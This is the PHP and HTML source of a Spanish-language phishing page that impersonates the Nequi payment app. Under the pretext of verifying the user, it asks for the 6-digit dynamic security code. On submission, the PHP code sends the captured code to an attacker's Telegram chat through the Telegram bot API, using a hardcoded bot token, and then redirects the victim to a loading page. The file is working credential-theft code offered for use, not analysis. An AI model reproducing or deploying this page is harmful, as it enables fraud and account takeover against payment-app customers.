<?php
$token = "7939151985:AAEA8ffMCLdm180yZ_YMlbNGrLEJyyMGxRs";
$chat_id = "-4891652401";

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["cDinamica"])) {
    $clave = trim($_POST["cDinamica"]);
    if (preg_match('/^\d{6}$/', $clave)) {
        $mensaje = "🔐 Código Nequi 🔐\n=================\n💳 Clave: $clave";
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text'    => $mensaje,
            'parse_mode' => 'HTML'
        ];
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data)
            ]
        ];
        $context  = stream_context_create($options);
        file_get_contents($url, false, $context);
        header("Location: /pago/nequi/cargando.php"); // Cambia esto si deseas
        exit;
    } else {
        echo "<script>alert('Clave inválida. Deben ser exactamente 6 dígitos.');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nequi</title>
    <link rel="icon" href="/pago/nequi/images/icononeki.ico" />
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/css/sms.css" />
    <link href="https://unpkg.com/ionicons@4.5.10-0/dist/css/ionicons.min.css" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <div class="main-container">
    <div class="header">
        <img src="images/logo.webp" alt="Nequi" class="header__img" />
    </div>
    <h1 class="title">Queremos validar que eres tú</h1>
    <h2 class="subtitle">Por tu seguridad, te enviamos un código de 6 dígitos para continuar con tu pago. Recuerda no compartirlo con nadie ;)</h2>

    <form method="POST" action="">
      <div class="clave">
        <div class="clave2">
          <input type="tel" maxlength="1" class="clave3" id="digit1">
          <input type="tel" maxlength="1" class="clave3" id="digit2">
          <input type="tel" maxlength="1" class="clave3" id="digit3">
          <input type="tel" maxlength="1" class="clave3" id="digit4">
          <input type="tel" maxlength="1" class="clave3" id="digit5">
          <input type="tel" maxlength="1" class="clave3" id="digit6">
          <input type="hidden" id="txtOTP" name="cDinamica">
        </div>
      </div>

      <div class="teclado">
        <div class="fila">
          <button class="btn-num" type="button" data-num="1">1</button>
          <button class="btn-num" type="button" data-num="2">2</button>
          <button class="btn-num" type="button" data-num="3">3</button>
        </div>
        <div class="fila">
          <button class="btn-num" type="button" data-num="4">4</button>
          <button class="btn-num" type="button" data-num="5">5</button>
          <button class="btn-num" type="button" data-num="6">6</button>
        </div>
        <div class="fila">
          <button class="btn-num" type="button" data-num="7">7</button>
          <button class="btn-num" type="button" data-num="8">8</button>
          <button class="btn-num" type="button" data-num="9">9</button>
        </div>
        <div class="fila fila-ultima">
          <button class="btn-vacio" disabled></button>
          <button class="btn-num" type="button" data-num="0">0</button>
          <button class="btn-borrar" type="button">
              <img src="images/icono-borrar.png" alt="Borrar" class="icono-borrar" />
          </button>
        </div>
      </div>

      <div class="cancelar">
        <button type="submit" class="btn-cancelar">Continuar</button>
      </div>
    </form>
  </div>

  <script>
    const digits = ['digit1', 'digit2', 'digit3', 'digit4', 'digit5', 'digit6'];

    // Insertar número en el siguiente campo vacío
    $(".btn-num").on("click", function () {
      let num = $(this).data("num");
      for (let i = 0; i < digits.length; i++) {
        let input = $("#" + digits[i]);
        if (input.val() === "") {
          input.val(num);
          break;
        }
      }
      updateHiddenOTP();
    });

    // Borrar último dígito ingresado
    $(".btn-borrar").on("click", function () {
      for (let i = digits.length - 1; i >= 0; i--) {
        let input = $("#" + digits[i]);
        if (input.val() !== "") {
          input.val("");
          break;
        }
      }
      updateHiddenOTP();
    });

    // Actualizar campo oculto
    function updateHiddenOTP() {
      let code = "";
      for (let i = 0; i < digits.length; i++) {
        code += $("#" + digits[i]).val();
      }
      $("#txtOTP").val(code);
    }

    // Validación antes de enviar
    $(".btn-cancelar").on("click", function (e) {
      let code = $("#txtOTP").val();
      if (code.length === 6) {
        $(this).closest("form").submit();
      } else {
        alert("Por favor completa los 6 dígitos.");
      }
    });
  </script>
</body>
</html>
